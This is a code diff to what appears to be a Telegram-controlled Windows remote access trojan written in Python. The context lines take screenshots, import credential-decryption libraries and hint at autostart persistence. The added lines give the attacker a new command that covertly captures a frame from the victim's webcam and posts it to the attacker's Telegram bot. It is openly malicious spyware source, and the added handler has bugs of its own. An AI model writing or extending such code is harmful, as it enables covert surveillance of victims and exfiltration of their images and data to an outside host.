@@ -3,6 +3,7 @@ import os
 import requests 
 from PIL import ImageGrab 
 import shutil 
+import cv2
 import sqlite3 
 import win32crypt 
 import subprocess 
@@ -38,6 +39,17 @@ def send_screen(command) :
     screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg') 
     screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb') 
     files = {'photo': screen} 
+    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files) 
+
+@bot.message_handler(commands=['webscreen', 'webscreen']) 
+def send_screen(command) :
+    bot.send_message(chat_id, "Wait...") 
+    cap = cv2.VideoCapture(0)
+    for i in range(30):
+     cap.read()
+    ret, frame = cap.read()
+    files = cv2.imwrite('Photo.png', frame)   
+    cap.release() 
     requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files) 
 
 @bot.message_handler(commands=['autostart', 'Autostart']) 
